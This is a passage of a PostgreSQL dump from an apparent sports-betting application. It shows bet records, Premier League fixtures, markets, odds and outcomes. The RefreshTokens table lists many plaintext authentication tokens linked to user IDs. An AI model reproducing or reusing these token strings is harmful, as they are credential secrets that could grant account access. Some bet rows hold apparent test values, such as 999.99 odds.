40547320-7419-4307-bfe6-926a4afb172b	2a414a5c-f857-44fd-ae76-e3260c9382be	BET202511142310516376	Parlay	Lost	2025-11-14 17:10:51.094648-06	2025-11-14 17:11:23.396241-06	0.00	\N	\N	5.2500	262.50	USD	50.00	USD
4dc3e93e-b116-4033-93f1-7ed91cd405ef	1ef7db4b-d2b3-49ee-a985-ef4034978689	BET202511150421568163	Single	Pending	2025-11-14 22:21:56.319011-06	\N	\N	\N	\N	3.2000	123.04	USD	38.45	USD
19ab099d-ec3a-47d9-9168-7e2f9ffa4031	1ef7db4b-d2b3-49ee-a985-ef4034978689	BET202511150421563603	Single	Pending	2025-11-14 22:21:56.388422-06	\N	\N	\N	\N	3.3000	227.14	USD	68.83	USD
ef624305-8e39-4800-a013-bb3fb51d7a1a	1ef7db4b-d2b3-49ee-a985-ef4034978689	BET202511150421565210	Single	Pending	2025-11-14 22:21:56.393796-06	\N	\N	\N	\N	3.4000	299.20	USD	88.00	USD
c0072d32-8763-465d-b6d7-060bc85a5fb2	1ef7db4b-d2b3-49ee-a985-ef4034978689	BET202511150421567445	Single	Pending	2025-11-14 22:21:56.397187-06	\N	\N	\N	\N	1.8500	148.76	USD	80.41	USD
235cfdb6-846c-4f4c-afab-3b960890cd0d	1ef7db4b-d2b3-49ee-a985-ef4034978689	BET202511150421568537	Single	Pending	2025-11-14 22:21:56.400889-06	\N	\N	\N	\N	2.2000	199.56	USD	90.71	USD
366faaac-d6b1-42ae-a024-05781c406273	e13aba69-091f-423e-a362-22d6dd26c14e	BET202511150421566906	Single	Pending	2025-11-14 22:21:56.403969-06	\N	\N	\N	\N	1.8500	116.48	USD	62.96	USD
b0c209de-d875-4eca-97dd-d42007953b04	e13aba69-091f-423e-a362-22d6dd26c14e	BET202511150421563303	Single	Pending	2025-11-14 22:21:56.407155-06	\N	\N	\N	\N	3.2000	168.29	USD	52.59	USD
08e8e76b-d5d8-4c80-bb23-b7ece33292dd	e13aba69-091f-423e-a362-22d6dd26c14e	BET202511150421565428	Single	Pending	2025-11-14 22:21:56.411002-06	\N	\N	\N	\N	2.1000	68.69	USD	32.71	USD
14d12b67-c8e4-40b8-abb6-611ee015e1a4	e13aba69-091f-423e-a362-22d6dd26c14e	BET202511150421565194	Single	Pending	2025-11-14 22:21:56.414707-06	\N	\N	\N	\N	3.4000	243.71	USD	71.68	USD
00365444-2801-4692-8f00-f9bbee10b2df	e13aba69-091f-423e-a362-22d6dd26c14e	BET202511150421564201	Single	Pending	2025-11-14 22:21:56.417926-06	\N	\N	\N	\N	2.3000	46.30	USD	20.13	USD
4a2cac53-5e0e-4015-afad-5bb35d94cf36	1ef7db4b-d2b3-49ee-a985-ef4034978689	BET202511150426056242	Single	Pending	2025-11-14 22:26:05.877518-06	\N	\N	\N	\N	2.6000	142.45	USD	54.79	USD
8ae04dc4-bc7e-42ae-afbd-7320ebe4189c	1ef7db4b-d2b3-49ee-a985-ef4034978689	BET202511150426056012	Single	Pending	2025-11-14 22:26:05.883187-06	\N	\N	\N	\N	1.8500	69.08	USD	37.34	USD
689931c8-d466-4aae-924d-57c49407e37d	e13aba69-091f-423e-a362-22d6dd26c14e	BET202511150426053905	Single	Pending	2025-11-14 22:26:05.9879-06	\N	\N	\N	\N	999.9900	18429.82	USD	18.43	USD
b4af0b77-3694-4e5b-9563-03f85adeada8	e13aba69-091f-423e-a362-22d6dd26c14e	BET202511150426053830	Single	Pending	2025-11-14 22:26:05.992022-06	\N	\N	\N	\N	4.0000	191.24	USD	47.81	USD
6e80a592-5cf8-47ae-bc82-678285521eac	91966209-ca29-439d-bea5-ea8b3a0dc2b0	BET202511150430526989	Single	Pending	2025-11-14 22:30:52.561832-06	\N	\N	\N	\N	999.9900	70549.29	GBP	70.55	GBP
09a2ab08-6fc0-4861-a3cc-7df113fe0c24	91966209-ca29-439d-bea5-ea8b3a0dc2b0	BET202511150430522445	Single	Pending	2025-11-14 22:30:52.565835-06	\N	\N	\N	\N	3.2000	146.91	GBP	45.91	GBP
c8cb7946-07cb-4818-a1d2-3cd609682900	b2503a1c-4e2c-4fdd-832e-fe27ce7627fa	BET202511150430528277	Single	Pending	2025-11-14 22:30:52.77415-06	\N	\N	\N	\N	2.2000	74.76	EUR	33.98	EUR
0072e65b-8110-4988-af24-901a25e84380	838d44ed-4447-480a-91c6-5011bb11369f	BET202511150430529317	Single	Pending	2025-11-14 22:30:52.995581-06	\N	\N	\N	\N	1.8500	62.31	STR	33.68	STR
4cafb04b-5c80-4c6d-9510-3972e327de6d	d1a9d8b1-5121-4415-b1ab-a79c02995c3e	BET202511150430534170	Single	Pending	2025-11-14 22:30:53.214259-06	\N	\N	\N	\N	3.3000	179.32	STR	54.34	STR
6b82aaaa-b584-4b22-af42-f7d95d9e6cc1	d029350a-0055-40fd-961b-07c65072613a	BET202511150430537648	Single	Pending	2025-11-14 22:30:53.435453-06	\N	\N	\N	\N	3.3000	184.21	USD	55.82	USD
1e7ba305-8280-4e5f-897d-e334cbb7a1fa	647ff2c3-4dd7-4778-b390-bd6c0f32dff0	BET202511150433309326	Single	Pending	2025-11-14 22:33:30.831915-06	\N	\N	\N	\N	3.3000	277.17	USD	83.99	USD
116af921-0c7b-467b-b685-38a1c9ea7b4e	e6535c73-b40c-462d-8faa-aab8cf8e6f01	BET202511150433309010	Single	Pending	2025-11-14 22:33:30.97341-06	\N	\N	\N	\N	1.7500	106.07	USD	60.61	USD
20826f4f-883c-4d30-b351-fd4d94b23f25	7e58c576-a98a-4973-8835-1b542aad3459	BET202511150433319561	Single	Pending	2025-11-14 22:33:31.113715-06	\N	\N	\N	\N	2.1000	181.48	USD	86.42	USD
068e8f92-7958-4f82-a955-ac773c965cf3	4a4c880b-41ed-4713-965f-de25d4d341cd	BET202511150433319405	Single	Pending	2025-11-14 22:33:31.253903-06	\N	\N	\N	\N	2.6000	231.82	GBP	89.16	GBP
53020a2f-c679-4e06-8759-ddba7f475798	29e88d16-814c-4d63-ad9a-01dc4240710e	BET202511150434159863	Single	Pending	2025-11-14 22:34:15.330834-06	\N	\N	\N	\N	2.3000	200.40	USD	87.13	USD
1f8e530d-db4c-4c66-8868-8f7a43398b54	773b8d10-e105-47c6-ab53-9a3b26759637	BET202511150434206596	Single	Pending	2025-11-14 22:34:20.491856-06	\N	\N	\N	\N	3.5000	193.80	JPY	55.37	JPY
dbe085fc-9c06-496c-8a52-7f506b72d98b	8c09f1af-1515-4495-837c-6674da6d2be3	BET202511150434252249	Single	Pending	2025-11-14 22:34:25.664404-06	\N	\N	\N	\N	3.3000	141.11	USD	42.76	USD
d2817a4c-e976-47ab-8842-fbe41afae344	093f6af7-5a7a-4c41-a4fd-4323ee0c501f	BET202511150434304503	Single	Pending	2025-11-14 22:34:30.844926-06	\N	\N	\N	\N	2.5000	112.85	USD	45.14	USD
2b519d55-f3ec-4155-bf68-1628295a2c4e	ce40595a-26f8-4659-a937-82dee702c2a8	BET202511150434368021	Single	Pending	2025-11-14 22:34:36.01039-06	\N	\N	\N	\N	3.2000	146.50	USD	45.78	USD
90939f65-9adf-4f94-998d-4c88fb2a9d7b	afab4f82-de2b-40c7-8000-0410e828e2b9	BET202511150435413692	Single	Pending	2025-11-14 22:35:41.17408-06	\N	\N	\N	\N	4.0000	250.08	USD	62.52	USD
809bb874-f60a-4ca9-98c7-a56dfbb633e9	bafd125b-cb44-47f1-9a25-93b69e7483ef	BET202511150435463228	Single	Pending	2025-11-14 22:35:46.336877-06	\N	\N	\N	\N	2.2000	171.95	NOK	78.16	NOK
ba1276c5-28e7-40a6-8f1c-26e13edb59b9	c47e3e35-7877-4802-8a02-02843973a1d4	BET202511150435515731	Single	Pending	2025-11-14 22:35:51.510297-06	\N	\N	\N	\N	3.3000	162.76	CAD	49.32	CAD
fcd166ea-255e-4ea6-bb41-95a00ef314a8	b70d5a3c-c776-4795-9caf-f83e60b822a4	BET202511150435564410	Single	Pending	2025-11-14 22:35:56.670521-06	\N	\N	\N	\N	3.4000	40.66	JPY	11.96	JPY
4244edc5-6713-4754-9832-2ac011011754	6d9f9662-688c-487c-8301-95625d842b7e	BET202511150436019682	Single	Pending	2025-11-14 22:36:01.834044-06	\N	\N	\N	\N	2.6000	166.92	AUD	64.20	AUD
94ecf60c-9447-49b6-99f5-ff6dac24af74	9d7aad08-481e-4dfb-aaaa-3bec95827c10	BET202511150437069722	Single	Pending	2025-11-14 22:37:06.992924-06	\N	\N	\N	\N	3.4000	149.40	CHF	43.94	CHF
cc3a0982-69e4-487f-bf1a-8ae290052071	db4ef871-1da4-4506-be39-f5d22ba1b4f6	BET202511150437123361	Single	Pending	2025-11-14 22:37:12.14792-06	\N	\N	\N	\N	2.6000	138.24	NZD	53.17	NZD
5c9771dc-3940-4240-99c2-6fe3cfe8f6ae	d079c970-6efb-4cf8-a8e1-baef89819fcc	BET202511150437177583	Single	Pending	2025-11-14 22:37:17.311091-06	\N	\N	\N	\N	4.0000	209.72	SEK	52.43	SEK
\.


--
-- Data for Name: Events; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."Events" ("Id", "LeagueId", "Name", "HomeTeamId", "AwayTeamId", "ScheduledStartTime", "Venue", "Status", "FinalScore") FROM stdin;
5854aeb8-17c2-44dc-85b4-6c7afe4f573d	6c71d468-8de9-4776-acd8-72a9f8404060	Arsenal vs Chelsea	108a20ec-4c0c-4952-9269-dd065e4e35fb	1b8bff5d-fe43-43b0-85c8-746070ddd593	2025-11-16 15:48:11.910444-06	Emirates Stadium	Completed	2:1
a5a7f758-07d0-4e82-ba80-4a29b72213ec	6c71d468-8de9-4776-acd8-72a9f8404060	Manchester United vs Liverpool	6fb766c0-2102-4a1a-9a79-63fd8647895a	a420711c-b1ad-4dd2-88cf-fb582c621b04	2025-11-16 17:04:46.681356-06	Old Trafford	Completed	2:1
9e572c95-5a6f-4010-b7e3-d804ccc3f4b2	6c71d468-8de9-4776-acd8-72a9f8404060	Tottenham vs Manchester City	a30873d5-ef58-47b8-b4fd-3914031c1ccd	3a3ace61-3d7e-48a2-9484-45002787779b	2025-11-17 17:04:46.773544-06	Tottenham Hotspur Stadium	Completed	0:3
02dfc377-26d3-4751-9363-43b38eb28663	6c71d468-8de9-4776-acd8-72a9f8404060	Arsenal vs Tottenham	108a20ec-4c0c-4952-9269-dd065e4e35fb	a30873d5-ef58-47b8-b4fd-3914031c1ccd	2025-11-18 17:04:46.869848-06	Emirates Stadium	Completed	3:1
6f7a8600-91d9-4957-afbf-ff87386813a5	6c71d468-8de9-4776-acd8-72a9f8404060	Chelsea vs Liverpool	1b8bff5d-fe43-43b0-85c8-746070ddd593	a420711c-b1ad-4dd2-88cf-fb582c621b04	2025-11-19 17:10:20.040732-06	Stamford Bridge	Completed	1:2
abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	6c71d468-8de9-4776-acd8-72a9f8404060	Manchester United vs Manchester City	6fb766c0-2102-4a1a-9a79-63fd8647895a	3a3ace61-3d7e-48a2-9484-45002787779b	2025-11-20 17:10:20.202405-06	Old Trafford	Completed	1:3
\.


--
-- Data for Name: Leagues; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."Leagues" ("Id", "Name", "Code", "SportId", "SportId1") FROM stdin;
6c71d468-8de9-4776-acd8-72a9f8404060	English Premier League	EPL	c44f70ac-88e7-4150-ab78-567845511786	\N
\.


--
-- Data for Name: LineLocks; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."LineLocks" ("Id", "UserId", "LockNumber", "EventId", "EventName", "MarketId", "MarketType", "MarketName", "OutcomeId", "OutcomeName", "Line", "ExpirationTime", "CreatedAt", "Status", "AssociatedBetId", "SettledAt", "LockFee", "LockFeeCurrency", "LockedOddsDecimal", "MaxStake", "MaxStakeCurrency") FROM stdin;
\.


--
-- Data for Name: Markets; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."Markets" ("Id", "EventId", "Type", "Name", "Description", "IsOpen", "IsSettled", "EventId1") FROM stdin;
4464a42b-c3ef-4b84-b9d8-9404fe1e0393	5854aeb8-17c2-44dc-85b4-6c7afe4f573d	Moneyline	Match Winner	Pick the winning team	t	t	5854aeb8-17c2-44dc-85b4-6c7afe4f573d
776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	a5a7f758-07d0-4e82-ba80-4a29b72213ec	Moneyline	Match Winner	Pick the winner	t	t	a5a7f758-07d0-4e82-ba80-4a29b72213ec
9670128a-a449-4ef0-8d2b-c73331be612a	9e572c95-5a6f-4010-b7e3-d804ccc3f4b2	Moneyline	Match Winner	Pick the winner	t	t	9e572c95-5a6f-4010-b7e3-d804ccc3f4b2
29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	02dfc377-26d3-4751-9363-43b38eb28663	Moneyline	Match Winner	Pick the winner	t	t	02dfc377-26d3-4751-9363-43b38eb28663
0b684835-6557-417e-a446-2b6ca7469b92	6f7a8600-91d9-4957-afbf-ff87386813a5	Moneyline	Match Winner	Pick the winner	t	t	6f7a8600-91d9-4957-afbf-ff87386813a5
ae017678-2dcc-4a8b-a225-42dd70f5bb79	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98	Moneyline	Match Winner	Pick the winner	t	t	abcdfcc3-f7f6-43d6-96ab-9f7b87220d98
\.


--
-- Data for Name: Outcomes; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."Outcomes" ("Id", "MarketId", "Name", "Description", "Line", "IsWinner", "IsVoid", "MarketId1", "CurrentOddsDecimal") FROM stdin;
4061ad93-119f-42e7-a916-68a0201e9df5	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	Chelsea Win	Chelsea wins the match	\N	f	f	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	4.0000
a23843a3-57c7-421f-a8e8-af24a5108a1d	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	Draw	Match ends in a draw	\N	f	f	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	3.4000
111b8361-5152-48f5-980c-c9fbc85e17af	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	Liverpool Win	Away win	\N	f	f	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	2.8000
3a7db331-aa81-471e-8d40-2d62c9b97a97	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	Draw	Draw	\N	f	f	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	3.4000
b1ca5c77-c3c3-4ad7-add3-945b5f691c9a	9670128a-a449-4ef0-8d2b-c73331be612a	Tottenham Win	Home win	\N	f	f	9670128a-a449-4ef0-8d2b-c73331be612a	3.5000
f9ccac8a-f365-44a9-a4fe-92a6433df336	9670128a-a449-4ef0-8d2b-c73331be612a	Draw	Draw	\N	f	f	9670128a-a449-4ef0-8d2b-c73331be612a	3.8000
12217ff4-c67a-48b7-a674-6b9c7107a023	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	Tottenham Win	Away win	\N	f	f	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	4.0000
50d3b606-be4b-425e-9025-899105c543b1	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	Draw	Draw	\N	f	f	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	3.6000
c5ff1112-94b3-43a1-b209-8a1563025734	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	Manchester United Win	Home win	\N	t	f	776bdb4a-4c1b-46a1-bdb5-70bfafe2820b	2.2000
c1b311fc-ac37-42a1-8c34-bcabbbcf8078	9670128a-a449-4ef0-8d2b-c73331be612a	Manchester City Win	Away win	\N	t	f	9670128a-a449-4ef0-8d2b-c73331be612a	1.7500
d98b2270-860d-4cd0-8e20-4269d2ae8b8b	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	Arsenal Win	Home win	\N	t	f	29f5d2b8-0ba8-40dc-ad13-431ec9a5380a	1.8500
808b32c3-e30f-48c9-a183-9dcae2993fcc	0b684835-6557-417e-a446-2b6ca7469b92	Chelsea Win	Home win	\N	f	f	0b684835-6557-417e-a446-2b6ca7469b92	2.5000
d46a0b7f-fb0e-4840-819c-531165148906	0b684835-6557-417e-a446-2b6ca7469b92	Draw	Draw	\N	f	f	0b684835-6557-417e-a446-2b6ca7469b92	3.2000
cf9f1713-0351-455c-b828-13592f74630b	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Manchester United Win	Home win	\N	f	f	ae017678-2dcc-4a8b-a225-42dd70f5bb79	2.6000
cd2ac0c5-9245-471b-9b3e-c82da2e5ae11	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Draw	Draw	\N	f	f	ae017678-2dcc-4a8b-a225-42dd70f5bb79	3.3000
4b65c61a-36fb-4fd0-a416-7d259f918ab2	0b684835-6557-417e-a446-2b6ca7469b92	Liverpool Win	Away win	\N	t	f	0b684835-6557-417e-a446-2b6ca7469b92	2.3000
fd9c368c-f590-49d7-a547-120cfc445371	ae017678-2dcc-4a8b-a225-42dd70f5bb79	Manchester City Win	Away win	\N	t	f	ae017678-2dcc-4a8b-a225-42dd70f5bb79	2.1000
3f35cca8-57c9-4816-94d3-49bdf80a6121	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	Arsenal Win	Arsenal wins the match	\N	t	f	4464a42b-c3ef-4b84-b9d8-9404fe1e0393	2.5000
\.


--
-- Data for Name: RefreshTokens; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."RefreshTokens" ("Id", "UserId", "Token", "ExpiresAt", "CreatedAt", "IsRevoked", "RevokedAt") FROM stdin;
cfbddea4-87d3-46b6-980a-17131168d250	ce40595a-26f8-4659-a937-82dee702c2a8	mSM2RCWEUd8RxvG1vw/sOFzRhPe4OYzWu75Uss+MxM2WSdlKS3Mfcs7HAS4CbfX8sub+/nPjAPOYFXs9Yc8CHw==	2025-11-21 19:50:06.049928-06	2025-11-14 19:50:06.049928-06	f	\N
e341532a-d96f-41a9-bf18-dc3da5ce01c1	ce40595a-26f8-4659-a937-82dee702c2a8	FcDJXIYTvjxkxUJvEMTJKNec1IPPmz9h3+M6qdptfLmCD4qIqrLtFS9REWMotnIno6AopiiUckq7UNAgFMBHpw==	2025-11-21 19:50:12.532619-06	2025-11-14 19:50:12.532619-06	f	\N
4a29ed37-36ee-4cd6-8e6a-ef518f1c056e	ce40595a-26f8-4659-a937-82dee702c2a8	LPswX8wmSDNwRygLVdr0MvKcpSslDWWNJ6O95CMLYdnuzHUkDnR0yMgZSTlq/OjZXg3zHxWjgO5Lsd4Pp3UPYA==	2025-11-21 19:52:06.281578-06	2025-11-14 19:52:06.281578-06	f	\N
763605e2-713b-4509-b53d-68276395b5b7	ce40595a-26f8-4659-a937-82dee702c2a8	PM4NJ0B5IfrHBEqLrqFzvRqCZ4s38FNlNnVPKuaqC0kHOMseoIrznrIDapo6g4tcDHLuXw01t3oyPPj9J2Bcbg==	2025-11-21 19:56:19.172854-06	2025-11-14 19:56:19.172854-06	t	2025-11-14 19:57:45.602834-06
5cc33fb3-16e6-43b8-a761-7926e7e4aef0	ce40595a-26f8-4659-a937-82dee702c2a8	Yam5vvDId1Q3KfnVyCf9wAKR2BOqsUC2UAfjYrRhBIPpcFVeueOTXhZlZmQ9rPDiMri0iyoGIDovIVxI9BLMlA==	2025-11-21 19:57:45.602977-06	2025-11-14 19:57:45.602977-06	t	2025-11-14 19:57:45.617199-06
4303d7a4-1c49-426e-a577-7b987ccb0c0e	d1a9d8b1-5121-4415-b1ab-a79c02995c3e	iRe2P1SYqYp4l0gIKHLPD38RKAoDJUtl+HyZtpEEo76d1N8rl4HAOYyeaqCpwb2m37ikrv7bM0EYvlWR8KQCkw==	2025-11-21 20:12:01.578697-06	2025-11-14 20:12:01.578697-06	f	\N
51ad1b53-18c0-4581-be90-7f184f65b246	d1a9d8b1-5121-4415-b1ab-a79c02995c3e	G7PhjidLLSwg1LrRM4CBavQj1xv9CKu3SolBpZdvIYQD/l6AtA4iBb2jBIsX+mUJJtsAzEtoPt+0RhQe3W5zdA==	2025-11-21 20:12:16.936924-06	2025-11-14 20:12:16.936924-06	f	\N
6436a995-2efc-4ddd-b706-9fd6960b3ee6	ce40595a-26f8-4659-a937-82dee702c2a8	v1X70u2CtPnl/zhS8kSWZReq3erkNRxy7eH1hU4MgsHXSpC6/78jqrfUZhPhumNW+h4kyu22r8SDB37JPFK/IQ==	2025-11-21 20:19:03.643093-06	2025-11-14 20:19:03.643093-06	f	\N
8526c2df-119e-4992-9b8c-139ae2b63445	838d44ed-4447-480a-91c6-5011bb11369f	RkpFQU1xWAwaJKTMq3Z1FQBoWnZ9TX42xImVKNSP05oTq4fXUp0Ef7rENX9qQ22CRzEnLmLQouHcoZlaRAF22w==	2025-11-21 20:20:05.309492-06	2025-11-14 20:20:05.309492-06	f	\N
0ead64a7-d890-4e2c-af8a-bd1f048614d6	ce40595a-26f8-4659-a937-82dee702c2a8	2nLNiCpixekQOnH9as/H2r48RYAbltebI3UNoOl4LnhOAKkv+81u58wXbIXcRbEJneV/U775Fv+V0aUje17VGg==	2025-11-21 20:22:24.646083-06	2025-11-14 20:22:24.646083-06	f	\N
e39eac06-238a-4934-a9a1-1379c8ce3397	ce40595a-26f8-4659-a937-82dee702c2a8	P9Hakqn9/enZ8nGYnVRTkILqgH7RO+50p6UOPdshtdKhugP+hku+Sm4Ea/wxvR/ZmLoLesZw1JHihkyJDAxq4A==	2025-11-21 20:25:29.901046-06	2025-11-14 20:25:29.901046-06	f	\N
f072d18e-2c2c-4e2c-90d5-9e704a10de49	1ef7db4b-d2b3-49ee-a985-ef4034978689	7Or2McbxoMtx9qv0y+I7pd6NNLYoxBQgXRcgpps791KueILToPz73hCPF0SgpS0VYiRAbOEBKYmtm/DDWc6lUA==	2025-11-21 20:27:57.721522-06	2025-11-14 20:27:57.721522-06	f	\N
af187537-27a8-4622-8ceb-73e46098dd20	c2348e10-104f-41f8-8b95-f1a9ab066f6e	Wp+wzIPS8G8QImbG3/6Aw3uzhhZX1RrOxx0g3ZFq3+RYHwNL4fzLasG/yFEJID11mGufUA7n+56GKsSuG3Wb7A==	2025-11-21 20:28:11.27346-06	2025-11-14 20:28:11.27346-06	f	\N
60f34c2e-4fb2-4d7f-b54f-ff065f712f31	1ef7db4b-d2b3-49ee-a985-ef4034978689	iGxufnPnmId2frZQmeZg34vZNcJDh6l3aI4/z2k/LfLF0K/byMZEcJI0Cyffrgcmqjc5h8S4XwnvT8bT3NDNRg==	2025-11-21 20:30:29.440695-06	2025-11-14 20:30:29.440695-06	f	\N
93988835-63b5-4cc1-b7fe-865792b1c9ae	c2348e10-104f-41f8-8b95-f1a9ab066f6e	EcIvRTvJoiLH2mzNTffOh4+d57yf6VmlpesQs8juy4P51uYzfPAbBrEXL+3DM64/K542xzTbXjk4NTd3ufGVFA==	2025-11-21 20:31:58.818078-06	2025-11-14 20:31:58.818078-06	f	\N
62a4a241-dcea-4cf3-9386-65356e727b51	4a4c880b-41ed-4713-965f-de25d4d341cd	Rm57df0s6NdJc68zhWRfpU2NW039bPYKiZWoaWsvykpyM2zvPe/CJaSh3rwgiIufYBe5opFq7HPXTZUjmcYZNg==	2025-11-21 20:40:10.658951-06	2025-11-14 20:40:10.658951-06	f	\N
246d0fe9-cc9b-44f5-98a2-3663ff5e55a7	29e88d16-814c-4d63-ad9a-01dc4240710e	kkMFDf+XD/IBRfDSaqj+DvnbCkdZDg1IK/BbSt3mpeQeE4Opp7MaaH6rj4Zu8PH7LJpvratcDOpaI432R3FZNg==	2025-11-21 20:40:10.658927-06	2025-11-14 20:40:10.658927-06	f	\N
116a8b17-12fe-43ae-aaf9-881352f2db47	773b8d10-e105-47c6-ab53-9a3b26759637	umt7APVWZVF7EWJJdgMJAdAYhXP8xHjYGcpLIeG4LtEqZXZAOVETJQ6jLe2SU1Llz7YqmDnvsfKGgwnMLuNZQA==	2025-11-21 20:40:10.658924-06	2025-11-14 20:40:10.658924-06	f	\N
d6c06a8f-3149-41b4-b0ac-c43197184fcd	7e58c576-a98a-4973-8835-1b542aad3459	kdsBShfZ1SYfjRrCsFAF6objXEMT46QDS76DaEx8wd5W9SAGW4KFOGLrSZ1BU/yxcIKTsVIb7VAcPwikNd6hpQ==	2025-11-21 20:40:10.659094-06	2025-11-14 20:40:10.659094-06	f	\N
df88951e-4e85-449a-b053-6688eed889d9	1ef7db4b-d2b3-49ee-a985-ef4034978689	U8krnlkKH7GzVJlOyAq44VQ2kNSzvcl3X7lh3czW+mitSlsv4GZ4ivOkI+7rcGw0nP1yiL/9TcebkGv8nCn1tg==	2025-11-21 20:40:40.743279-06	2025-11-14 20:40:40.743279-06	f	\N
0056ebc6-78c6-45e8-91ab-63ca8998213f	c2348e10-104f-41f8-8b95-f1a9ab066f6e	U3YI2Mgw2QRhctESBZndyrzqKs8qtiXf73abn2z2kI3QsT3aTNn+77SUBjLNj7b3AE/22OxJy1N6qFBADKHqMQ==	2025-11-21 20:40:40.84393-06	2025-11-14 20:40:40.84393-06	f	\N
42e1d98f-1ea1-4d1e-a9fd-3bad17209083	d029350a-0055-40fd-961b-07c65072613a	DA8xc7ayK3V6zeSoNy4Qn8ffYVvc11qIsMe64+LtFZPDqIGUJxU07jfbJaOdHUJVJl1gO7E55e0sRJAVz1hUrA==	2025-11-21 20:45:32.889787-06	2025-11-14 20:45:32.889787-06	f	\N
efe14a21-832e-4bfa-966b-b74da606f491	1ef7db4b-d2b3-49ee-a985-ef4034978689	2Neb+rLthrW7rRdpRndRwyNgrSg+whPE8A60Pfy4Tep9W7r1LPMv63GFIziOPIb9BB4Wppmv9neYr/djBV3tiA==	2025-11-21 20:45:36.760446-06	2025-11-14 20:45:36.760446-06	f	\N
661d3079-f121-4d35-a380-fd93979f5eb2	c2348e10-104f-41f8-8b95-f1a9ab066f6e	v151ixNSgp++vXsIbec9fnxMOEw9PPOzwy2tQsFhZ3pUOhXDvB/jPn/sJnfe5mhmyNMYy/keKsF5kKxMYfPivw==	2025-11-21 20:45:36.92452-06	2025-11-14 20:45:36.92452-06	f	\N
955e2951-7f70-4cf0-9c7c-79cda3889037	8c09f1af-1515-4495-837c-6674da6d2be3	5Ynq/M4tQmGQchOLsdpohppnVm6hOmlZbSQqvDLePqQteUOHy2L3pvwILluvGpHEcXVdR4k3Z6EExk1kgpmAFw==	2025-11-21 20:47:36.565465-06	2025-11-14 20:47:36.565465-06	f	\N
a0d3fca5-b833-4261-944a-6e0ef3421c24	8c09f1af-1515-4495-837c-6674da6d2be3	6l5YOUcwyMoHwcspxg87k4Tle027/8iaAn7lyc8A2GfG7dUhonYNgwSV2bKUOz2asmBpM8Q7R5gWNXVP1ZNeHQ==	2025-11-21 20:47:37.12473-06	2025-11-14 20:47:37.12473-06	f	\N
63c6644f-6c7a-4bea-b8bd-dd257889b94b	1ef7db4b-d2b3-49ee-a985-ef4034978689	1IKRuq6mDJ3CGew6X7FBIIWJdmJgsVHDiLQ0ixHScBGuMUrkfePNl+8UItNoS7FcX4bvJAgnt7ZBm6hJImSI9w==	2025-11-21 20:47:41.993534-06	2025-11-14 20:47:41.993534-06	f	\N
5851a5f9-8f6a-435f-87d1-f821c7758166	c2348e10-104f-41f8-8b95-f1a9ab066f6e	d69eyAIBMgu0F3GB4rXBRuP3xyMXBrK0cHvtpkivgd5IfRdqJ9NjLmEod8lHA+LIZbcm+zVVEsSqd+ffbDGvwA==	2025-11-21 20:47:42.161705-06	2025-11-14 20:47:42.161705-06	f	\N
5407bdac-f23c-4dab-a2f5-7d279a7f9a2b	1ef7db4b-d2b3-49ee-a985-ef4034978689	W05IqlEWUlJmqTvldV5inArXM6p/FHNM1gd5I/C9unWA4OUH6LFFKc1NiUmewroeI6fZluZ7t8LxcBT+1feheA==	2025-11-21 20:50:44.184363-06	2025-11-14 20:50:44.184363-06	f	\N
237306f7-e864-4f04-918e-04ce44e3eedb	c2348e10-104f-41f8-8b95-f1a9ab066f6e	+sIp/TMjOW+lAqMg8LtHjGwiwzjuXsF6wfH+tjleLs2QBDqh56l+qUFmPyN59ez7ZWdP8gvUP4tk87CRt4rKlg==	2025-11-21 20:50:44.363089-06	2025-11-14 20:50:44.363089-06	f	\N
4fed9df7-11b5-4ba7-b6d1-7b62206cb087	c47e3e35-7877-4802-8a02-02843973a1d4	TTkkq+zSoOI6xRZGG1ZYI+6KyRfkccMQJ3Y4puI9lvmmWyVWBcAybFxLRv8X3t4NRUaaMjSF3gO2oooKJcXP5A==	2025-11-21 20:52:14.527682-06	2025-11-14 20:52:14.527682-06	f	\N
cebedbdf-e83b-413f-8e44-92ddcb463257	afab4f82-de2b-40c7-8000-0410e828e2b9	GnBn0f7x6YZNjHC4I6/FjJLsTFx/UAH+8gtBtdDfMgikn+/hQYZ9z9RfJ2C6h+HAWNWJAaj3T/kWIbnlkB0a5g==	2025-11-21 20:52:14.527683-06	2025-11-14 20:52:14.527683-06	f	\N
76071f81-789d-4b4b-8a4d-04848f3e745c	91966209-ca29-439d-bea5-ea8b3a0dc2b0	4tnlFjiN4MvdOPsURexV/N/H/WllkknQ0dXBFYC3VUNr2ta/rKbSYk0KjGvWEZg9Cyg715CUsEmERv8pU61JDw==	2025-11-21 20:52:14.527683-06	2025-11-14 20:52:14.527683-06	f	\N
89f41141-2c6e-4b1d-b831-178b77d4b7d2	db4ef871-1da4-4506-be39-f5d22ba1b4f6	PNusEiIIkcW0jDKhGJyqalPpvwuCO5X/gFzi6OGHP4bu/u2g95lGAILvxauVFl98anG/hcNT1wKnCrsxhYw3Mg==	2025-11-21 20:53:34.553645-06	2025-11-14 20:53:34.553645-06	f	\N
